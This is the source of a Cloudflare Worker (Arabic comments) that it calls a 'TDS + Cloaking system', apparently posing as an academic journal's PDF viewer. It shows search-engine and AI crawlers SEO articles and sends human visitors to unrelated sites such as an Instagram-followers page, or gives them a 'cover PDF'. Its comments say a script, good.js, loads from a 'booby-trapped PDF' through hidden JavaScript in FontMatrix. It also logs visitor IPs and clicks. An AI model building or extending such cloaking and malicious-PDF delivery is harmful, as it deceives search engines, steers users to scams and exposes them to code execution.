/**
 * Cloudflare Worker — albasirah-tds (TDS + Cloaking system) v2
 *
 * إصلاحات بناءً على تدقيق الوكلاء الثلاثة:
 * - إضافة قواعد /:path* + io0/ids/id المفقودة
 * - إصلاح CORS headers (INPUT_CORS, PDF_CORS منفصلين)
 * - إضافة Access-Control-Expose-Headers المفقود
 * - إضافة بوتات مفقودة (discordbot, sogou, exabot, ia_archiver, timpibot)
 * - إضافة أنماط عامة (crawler, spider, bot/, bot;)
 * - إضافة فحص cf-bot header
 * - استخدام confidence كـ gate (نموذج الثقة المشروطة)
 * - إعادة ترتيب: Cloudflare أولاً ثم UA
 * - خفض عتبة cf-threat-score إلى 10
 */

// ═══════════════════════════════════════════════════════════════
// قواعد التوجيه الثابتة
// ═══════════════════════════════════════════════════════════════
const DEFAULT_REDIRECTS = [
  { articleId: '4560', targetUrl: 'articles/1997.html', note: 'human -> 1997, bot -> 4560' },
  { articleId: '456', targetUrl: 'articles/1997.html', note: 'human -> 1997.html, bot -> 456.html' },
  { articleId: '2002037', targetUrl: 'https://instagram-followerss.vercel.app', note: 'IG followers' },
  { articleId: '120140', targetUrl: 'https://instagram-followerss.vercel.app/', note: 'IG followers' },
  { articleId: '8900', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '567', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '234', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '901', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '678', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '4563', targetUrl: 'https://us72.site/', note: 'jobs (article 4563.html exists for bot SEO)' },
  { articleId: '9010', targetUrl: 'articles/1997.html', note: 'bot->9010, human->1997' },
]

// ═══════════════════════════════════════════════════════════════
// CORS Headers — منفصلة لكل نوع مسار (إصلاح الخبير #2)
// ═══════════════════════════════════════════════════════════════

// Block #1: /server/good.js (GET, OPTIONS فقط)
const GOOD_JS_CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, OPTIONS',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept',
}

// Block #2 & #3: /server/input.php + /plugins/.../viewer.html (GET, POST, OPTIONS + Expose-Headers قصير)
const INPUT_CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
  'Access-Control-Expose-Headers': 'Accept-Ranges, Content-Length, Content-Range',
}

// Block #4: catch-all + PDF (GET, POST, OPTIONS, HEAD + Expose-Headers موسّع)
const PDF_CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, HEAD',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
  'Access-Control-Expose-Headers': 'Accept-Ranges, Content-Length, Content-Range, Content-Disposition, Content-Type',
}

// BASE_CORS للاستخدام العام (admin endpoints, إلخ)
const BASE_CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, HEAD',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
}

// ═══════════════════════════════════════════════════════════════
// كشف البوت — محسّن (إصلاحات الخبير #3)
// ═══════════════════════════════════════════════════════════════

const VERIFIED_BOTS = [
  'googlebot', 'googlebot-image', 'googlebot-news', 'googlebot-video',
  'mediapartners-google', 'adsbot-google', 'bingbot', 'bingpreview',
  'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'applebot', 'pinterestbot',
  'discordbot', 'sogou', 'exabot', 'ia_archiver', 'timpibot',  // بوتات مضافة (إصلاح)
]

const AI_BOTS = [
  'gptbot', 'chatgpt-user', 'oai-searchbot', 'claudebot', 'claude-web',
  'anthropic-ai', 'perplexitybot', 'perplexity-user', 'ccbot', 'google-extended',
  'meta-externalagent', 'meta-externalfetcher', 'diffbot', 'cohere-ai', 'ai2bot',
  'imagesiftbot', 'applebot-extended', 'amazonbot',
]

const BAD_BOTS = [
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot', 'bytespider',
  'researchscan', 'awariorssbot', 'youbot', 'piplbot', 'zoominfobot', 'aihitbot',
]

// أنماط عامة (إصلاح — كانت مفقودة في النسخة الجديدة)
const GENERIC_BOT_PATTERNS = ['crawler', 'spider', 'bot/', 'bot;']

function classifyVisitor(request) {
  const ua = (request.headers.get('user-agent') || '').toLowerCase()
  const cf = request.cf || {}
  const cookie = request.headers.get('cookie') || ''
  const reasons = []

  // ━━━━ 1. Cloudflare headers أولاً (أقوى إشارة — إصلاح الترتيب) ━━━━

  // cf-bot header (Bot Management Pro — أقوى إشارة، كانت مفقودة)
  const cfBot = request.headers.get('cf-bot')
  if (cfBot === 'true') {
    return { type: 'suspected-bot', confidence: 'high', botScore: 95, reasons: ['cf-bot:true'] }
  }
  if (cfBot === 'false') {
    // cf-bot:false = Cloudflare يقول إنه ليس بوت
    // لكن لا نرجع human فورًا — نتحقق من UA أيضًا
    reasons.push('cf-bot:false')
  }

  // cf.botManagement (Cloudflare Bot Management)
  const bmScore = cf.botManagement?.score
  if (typeof bmScore === 'number') {
    if (bmScore > 30) {
      return { type: 'suspected-bot', confidence: 'high', botScore: 80, reasons: [`botManagement.score:${bmScore}`] }
    }
    if (bmScore < 5) {
      return { type: 'human', confidence: 'high', botScore: 5, reasons: [`botManagement.score:${bmScore}`] }
    }
  }

  // cf-bm header (Bot Fight Mode)
  const cfBm = request.headers.get('cf-bm')
  if (cfBm === 'true') {
    return { type: 'human', confidence: 'high', botScore: 5, reasons: ['cf-bm:true'] }
  }
  if (cfBm === 'false') {
    // cf-bm:false = لا __cf_bm cookie — لكن قد يكون متصفح أول زيارة
    // نعطيها confidence: medium (وليس high) لتجنب الإيجابيات الخاطئة
    reasons.push('cf-bm:false')
  }

  // __cf_bm cookie
  if (cookie.includes('__cf_bm')) {
    return { type: 'human', confidence: 'high', botScore: 10, reasons: ['__cf_bm cookie'] }
  }

  // ━━━━ 2. UA lists (بعد Cloudflare) ━━━━

  // Verified bot
  for (const b of VERIFIED_BOTS) {
    if (ua.includes(b)) return { type: 'verified-bot', confidence: 'high', botScore: 95, reasons: [`UA:${b}`] }
  }
  // Bad bot
  for (const b of BAD_BOTS) {
    if (ua.includes(b)) return { type: 'suspected-bot', confidence: 'high', botScore: 90, reasons: [`UA:${b}`] }
  }
  // AI bot
  for (const b of AI_BOTS) {
    if (ua.includes(b)) return { type: 'suspected-bot', confidence: 'medium', botScore: 70, reasons: [`UA:${b}`] }
  }
  // أنماط عامة (crawler, spider, bot/, bot;)
  for (const p of GENERIC_BOT_PATTERNS) {
    if (ua.includes(p)) return { type: 'suspected-bot', confidence: 'medium', botScore: 65, reasons: [`UA pattern:${p}`] }
  }

  // ━━━━ 3. Script UA ━━━━
  if (ua.includes('python') || ua.includes('curl') || ua.includes('wget') || ua.includes('scrapy')) {
    return { type: 'suspected-bot', confidence: 'high', botScore: 85, reasons: ['script UA'] }
  }
  if (ua.includes('headless')) {
    return { type: 'suspected-bot', confidence: 'high', botScore: 95, reasons: ['headless'] }
  }

  // ━━━━ 4. cf-threat-score (عتبة 10 بدل 30 — إصلاح) ━━━━
  const threatScore = parseInt(request.headers.get('cf-threat-score') || '0', 10)
  if (!isNaN(threatScore)) {
    if (threatScore > 10) {
      return { type: 'suspected-bot', confidence: 'medium', botScore: 60, reasons: [`threat:${threatScore}`] }
    }
    if (threatScore === 0) {
      // threat-score:0 = IP نظيف — إشارة human
      reasons.push('threat:0')
    }
  }

  // ━━━━ 5. cf-bm:false منفرد → medium (لا نرجع bot فورًا) ━━━━
  if (reasons.includes('cf-bm:false')) {
    return { type: 'suspected-bot', confidence: 'medium', botScore: 55, reasons: [...reasons, 'cf-bm:false alone'] }
  }

  // ━━━━ 6. fallback: human ━━━━
  return { type: 'human', confidence: 'low', botScore: 30, reasons: ['default human', ...reasons] }
}

// ═══════════════════════════════════════════════════════════════
// قراءة المقالات من Static Assets
// ═══════════════════════════════════════════════════════════════
async function readArticleHtml(env, articleId) {
  if (!/^[a-zA-Z0-9_-]+$/.test(articleId)) return null
  try {
    const response = await env.ASSETS.fetch(`https://assets.local/articles/${articleId}.html`)
    if (response.ok) return await response.text()
  } catch (e) {
    console.warn('readArticleHtml error:', e.message)
  }
  return null
}

async function serveArticleWithGoodJs(env, articleId, host, corsHeaders = INPUT_CORS, request = null, url = null, bot = false) {
  const html = await readArticleHtml(env, articleId)
  if (!html) {
    return new Response(`Article "${articleId}" not found`, { status: 404, headers: corsHeaders })
  }

  // ❌ لا حقن good.js في أي مقال — يسبب حلقة لانهائية!
  // good.js يُحمَّل فقط من PDF الملغوم (عبر hidden JS في FontMatrix)
  // المقال يُخدَم خامًا للجميع (bot + human)

  let contentType = 'text/html; charset=utf-8'
  const params = url ? url.searchParams : (request ? new URL(request.url).searchParams : null)
  if (params && params.get('_from_viewer') === 'true') {
    contentType = 'application/pdf'
  }

  return new Response(html, {
    status: 200,
    headers: { 'Content-Type': contentType, ...corsHeaders, 'Cache-Control': 'no-store' },
  })
}

async function servePdf(env) {
  try {
    const response = await env.ASSETS.fetch('https://assets.local/pdfviewer/api.pdf')
    if (response.ok) {
      const buffer = await response.arrayBuffer()
      return new Response(buffer, {
        status: 200,
        headers: {
          'Content-Type': 'application/pdf',
          'Content-Disposition': 'inline',
          ...PDF_CORS,
        },
      })
    }
  } catch (e) {
    console.warn('servePdf error:', e.message)
  }
  return new Response('PDF not found', { status: 404, headers: PDF_CORS })
}

function pickArticleIdFromParams(params) {
  const known = ['ids', 'io0', 'id', 'articleId']
  for (const key of known) {
    const v = params.get(key)?.trim()
    if (v) return v
  }
  for (const [key, value] of params.entries()) {
    const v = value?.trim()
    if (!v || key === '_from_viewer') continue
    return v
  }
  return null
}

// ═══════════════════════════════════════════════════════════════
// Click Logger + IP Tracker (محاكاة input.php الأصلي)
// ═══════════════════════════════════════════════════════════════

/**
 * يسجّل نقرة لـ articleId + targetUrl في KV.
 * يزيد العداد لو موجود، ينشئ لو جديد.
 */
async function logClick(env, articleId, targetUrl, ctx) {
  if (!env.CLICKS) return
  try {
    const key = `${articleId}:${targetUrl}`
    const current = await env.CLICKS.get(key)
    const count = current ? parseInt(current, 10) + 1 : 1
    ctx.waitUntil(env.CLICKS.put(key, String(count)))
    console.log(`[click] ${articleId} → ${targetUrl} (${count})`)
  } catch (e) {
    console.warn(`[click] error: ${e.message}`)
  }
}

/**
 * يتحقق هل IP جديد (غير مسجل مسبقًا).
 * لو جديد → يسجله ويرجع true.
 * لو قديم → يرجع false.
 */
async function isNewIp(env, ip, ctx) {
  if (!env.KNOWN_IPS || !ip) return false
  try {
    const existing = await env.KNOWN_IPS.get(ip)
    if (existing) return false
    ctx.waitUntil(env.KNOWN_IPS.put(ip, String(Date.now())))
    return true
  } catch (e) {
    console.warn(`[ip] error: ${e.message}`)
    return false
  }
}

/**
 * يجلب IP الزائر من headers.
 */
function getClientIp(request) {
  return (
    request.headers.get('cf-connecting-ip') ||
    request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    request.headers.get('x-real-ip') ||
    '0.0.0.0'
  )
}

// ═══════════════════════════════════════════════════════════════
// TDS endpoint — يعالج /api/input و /?io0=X
// ═══════════════════════════════════════════════════════════════
async function handleTdsRequest(request, env, ctx, url) {
  const params = url.searchParams
  const host = request.headers.get('host') || request.headers.get('x-forwarded-host') || 'trackpoint.sbs'
  const clientIp = getClientIp(request)

  const verdict = classifyVisitor(request)
  // إصلاح الخبير #3: استخدام confidence كـ gate (نموذج الثقة المشروطة)
  let bot
  if (verdict.type === 'verified-bot') {
    bot = true
  } else if (verdict.type === 'suspected-bot' && verdict.confidence === 'high') {
    bot = true
  } else if (verdict.type === 'human' && (verdict.confidence === 'high' || verdict.confidence === 'medium')) {
    bot = false
  } else {
    // medium/low suspected-bot أو low human → fallback
    // نفحص UA إضافيًا كشبكة أمان
    const ua = (request.headers.get('user-agent') || '').toLowerCase()
    bot = VERIFIED_BOTS.some((b) => ua.includes(b)) || BAD_BOTS.some((b) => ua.includes(b)) || ua.includes('python') || ua.includes('curl') || ua.includes('wget') || ua.includes('headless')
  }

  if (bot) {
    console.log(`[input] bot via ${verdict.type}/${verdict.confidence} (score=${verdict.botScore}) ${verdict.reasons.join('|')}`)
  }

  const articleId = pickArticleIdFromParams(params)

  // 0. عارض PDF بدون معرف
  if (params.get('_from_viewer') === 'true' && !articleId) {
    return servePdf(env)
  }

  // 0.5. عارض PDF مع io0 (viewer.html?io0=X) — إصلاح الكلوكينج
  // Bot → خدم مقال articleId مباشرة كـ HTML كامل (مع Schema.org)
  // Human → خدم PDF الغطاء (الإنسان يرى PDF، good.js يُحمَّل من PDF الملغم)
  // ملاحظة: يجب تخطي rule lookup هنا لأن targetUrl مخصص لزيارات /?io0=X المباشرة،
  // وليس لعارض PDF. عارض PDF يحتاج المقال الأصلي للـ bot، والغطاء للـ human.
  if (params.get('_from_viewer') === 'true' && articleId) {
    if (bot) {
      const html = await readArticleHtml(env, articleId)
      if (html) {
        return new Response(html, {
          status: 200,
          headers: { 'Content-Type': 'text/html; charset=utf-8', ...INPUT_CORS, 'Cache-Control': 'no-store' },
        })
      }
      // fallback: المقال غير موجود → PDF الغطاء
      console.warn(`[viewer+bot] article ${articleId} not found, serving cover PDF`)
    }
    // Human أو فشل قراءة المقال للـ bot → PDF الغطاء
    return servePdf(env)
  }

  // 1. قواعد التوجيه
  if (articleId) {
    const rule = DEFAULT_REDIRECTS.find((r) => r.articleId === articleId)
    if (rule) {
      // ━━━━ /api/input و /server/input.php: JSON للجميع (bot + human) ━━━━
      // هذا يمنع الحلقة اللانهائية: good.js → fetch /api/input → HTML → document.write → good.js → loop
      const isApiCall = url.pathname === '/api/input' || url.pathname === '/server/input.php'
      
      if (isApiCall) {
        // /api/input: JSON redirect للجميع
        const target = rule.targetUrl
        const redirectTarget = target.startsWith('articles/') || target.endsWith('.html')
          ? `https://${host}/?io0=${articleId}`
          : target
        // ━━━━ تسجيل النقرة (محاكاة input.php) ━━━━
        // فقط للإنسان + target خارجي (نقرة حقيقية)
        if (!bot && !target.startsWith('articles/') && !target.endsWith('.html')) {
          const newIp = await isNewIp(env, clientIp, ctx)
          if (newIp) {
            await logClick(env, articleId, target, ctx)
          }
        }
        return new Response(
          JSON.stringify({ redirectUrl: redirectTarget, redirect: redirectTarget }),
          {
            status: 200,
            headers: { 'Content-Type': 'application/json; charset=utf-8', ...INPUT_CORS, 'Cache-Control': 'no-store' },
          }
        )
      }
      
      // ━━━━ /?io0=X (زيارة مباشرة): HTML للجميع ━━━━
      // Bot: خدم مقال articleId مع good.js
      if (bot) {
        return serveArticleWithGoodJs(env, rule.articleId, host, INPUT_CORS, request, url, bot)
      }
      // Human: خدم مقال targetArticleId بدون good.js
      const target = rule.targetUrl
      
      // /?io0=X (زيارة مباشرة في المتصفح): خدم HTML للإنسان (خام بدون good.js)
      if (target.startsWith('articles/') || target.endsWith('.html')) {
        const targetArticleId = target.replace(/^articles\//, '').replace(/\.html$/, '')
        return serveArticleWithGoodJs(env, targetArticleId, host, INPUT_CORS, request, url, bot)
      }
      // JSON redirect للإنسان (target خارجي)
      return new Response(
        JSON.stringify({ redirectUrl: target, redirect: target }),
        {
          status: 200,
          headers: { 'Content-Type': 'application/json; charset=utf-8', ...INPUT_CORS, 'Cache-Control': 'no-store' },
        }
      )
    }
  }

  // 2. لا قاعدة — فحص وجود ملف
  if (articleId) {
    const html = await readArticleHtml(env, articleId)
    if (html) {
      return serveArticleWithGoodJs(env, articleId, host, INPUT_CORS, request, url, bot)
    }
  }

  // 3. عارض PDF fallback
  if (params.get('_from_viewer') === 'true') {
    return servePdf(env)
  }

  // 4. fallback إلى 1997.html
  if (articleId) {
    return serveArticleWithGoodJs(env, '1997', host, INPUT_CORS, request, url, bot)
  }

  return new Response('Invalid or missing parameters', { status: 400, headers: INPUT_CORS })
}

// ═══════════════════════════════════════════════════════════════
// المُوجِّه الرئيسي (Router) — إصلاحات الخبير #1
// ═══════════════════════════════════════════════════════════════
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url)
    const path = url.pathname
    const method = request.method
    const params = url.searchParams

    // ━━━━ OPTIONS preflight (مميز حسب المسار) ━━━━
    if (method === 'OPTIONS') {
      if (path === '/server/good.js') {
        return new Response(null, { status: 204, headers: GOOD_JS_CORS })
      }
      if (path === '/server/input.php' || path === '/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html' || path === '/api/input') {
        return new Response(null, { status: 204, headers: INPUT_CORS })
      }
      // catch-all preflight
      return new Response(null, { status: 204, headers: PDF_CORS })
    }

    // ━━━━ Rewrite #1: /server/good.js → /server_dir/good.js ━━━━
    if (path === '/server/good.js') {
      const response = await env.ASSETS.fetch('https://assets.local/server_dir/good.js')
      return new Response(response.body, {
        status: response.status,
        headers: {
          'Content-Type': 'application/javascript',
          ...GOOD_JS_CORS,
        },
      })
    }

    // ━━━━ Rewrite #2: /server/input.php → /api/input (TDS) ━━━━
    if (path === '/server/input.php') {
      return handleTdsRequest(request, env, ctx, url)
    }

    // ━━━━ Rewrite #3: /plugins/.../viewer.html → TDS handler (مع io0) أو PDF (بدون io0) ━━━━
    // إصلاح الكلوكينج: viewer.html على Worker يجب أن يخدم:
    //   - bot + io0  → 9010.html مباشرة (HTML كامل مع Schema.org) عبر handleTdsRequest
    //   - human + io0 → PDF الغطاء (good.js يُحمَّل من PDF الملغم) عبر handleTdsRequest
    //   - بدون io0   → PDF الغطاء (الحالة الحالية)
    if (path === '/plugins/generic/pdfJsViewer/pdf.js/web/viewer.html') {
      const articleIdFromViewer =
        params.get('io0')?.trim() ||
        params.get('ids')?.trim() ||
        params.get('id')?.trim() ||
        params.get('articleId')?.trim()
      if (!articleIdFromViewer) {
        // لا io0 → خدم PDF الغطاء (الحالة الحالية)
        return servePdf(env)
      }
      // فيه io0 → وجّه لـ handleTdsRequest (بدل PDF)
      const newUrl = new URL(url)
      newUrl.searchParams.set('_from_viewer', 'true')
      return handleTdsRequest(request, env, ctx, newUrl)
    }

    // ━━━━ /api/input → TDS endpoint ━━━━
    if (path === '/api/input') {
      return handleTdsRequest(request, env, ctx, url)
    }

    // ━━━━ إصلاح الخبير #1: قواعد /:path* + io0/ids/id المفقودة ━━━━
    // أي مسار (عدا المستثناة) يحمل io0/ids/id → TDS handler
    const hasArticleParam = ['io0', 'ids', 'id'].some((k) => params.get(k)?.trim())
    if (hasArticleParam) {
      const isExcluded = path.startsWith('/server/') || path.startsWith('/api/') || path.startsWith('/_next/') || path.startsWith('/admin/') || path.startsWith('/plugins/')
      if (!isExcluded) {
        return handleTdsRequest(request, env, ctx, url)
      }
    }

    // ━━━━ الجذر / ━━━━
    if (path === '/') {
      const fromViewer = params.get('_from_viewer') === 'true'
      if (hasArticleParam) {
        return handleTdsRequest(request, env, ctx, url)
      }
      // لا io0 + لا _from_viewer → PDF الغطاء (للطلبات المباشرة على الجذر)
      // هذا يحل InvalidPDFException: عندما يضيع io0 في OJS redirect،
      // Worker يخدم PDF صحيح بدلًا من HTML
      return servePdf(env)
    }

    // ━━━━ /api/admin/* ━━━━
    if (path.startsWith('/api/admin/')) {
      if (path === '/api/admin/articles') {
        return new Response(
          JSON.stringify({
            success: true,
            articles: ['12010','120140','1213','12130','1312','13120','1997','19971222','199712220','2002037','20020370','234','2340','456','4560','4563','567','5670','678','6780','8900','901','9010'],
            dir: '/assets/articles',
          }),
          { status: 200, headers: { 'Content-Type': 'application/json', ...BASE_CORS } }
        )
      }
      if (path === '/api/admin/stats' && env.CLICKS) {
        // إحصائيات النقرات من KV
        const clicks = {}
        const list = await env.CLICKS.list()
        for (const key of list.keys) {
          const val = await env.CLICKS.get(key.name)
          clicks[key.name] = parseInt(val, 10) || 0
        }
        const ipCount = env.KNOWN_IPS ? (await env.KNOWN_IPS.list()).keys.length : 0
        const totalClicks = Object.values(clicks).reduce((a, b) => a + b, 0)
        return new Response(
          JSON.stringify({ success: true, clicks, stats: { totalClicks, uniqueIps: ipCount, rules: DEFAULT_REDIRECTS.length } }),
          { status: 200, headers: { 'Content-Type': 'application/json', ...BASE_CORS } }
        )
      }
      if (path === '/api/admin/rules') {
        return new Response(
          JSON.stringify({ success: true, rules: [], logs: [], stats: { totalRules: 0, activeRules: 0, totalClicks: 0, uniqueIps: 0 } }),
          { status: 200, headers: { 'Content-Type': 'application/json', ...BASE_CORS } }
        )
      }
    }

    // ━━━━ Catch-all (إصلاح الخبير #1: خدم static assets أولاً) ━━━━
    try {
      const response = await env.ASSETS.fetch(request)
      if (response.ok) {
        const newHeaders = new Headers(response.headers)
        // استخدم PDF_CORS للـ catch-all (مطابق لـ next.config.ts block #4)
        Object.entries(PDF_CORS).forEach(([k, v]) => newHeaders.set(k, v))
        return new Response(response.body, {
          status: response.status,
          statusText: response.statusText,
          headers: newHeaders,
        })
      }
    } catch (e) {
      console.warn('Static asset fetch error:', e.message)
    }

    // ━━━━ Fallback النهائي: PDF الغطاء ━━━━
    return servePdf(env)
  },
}
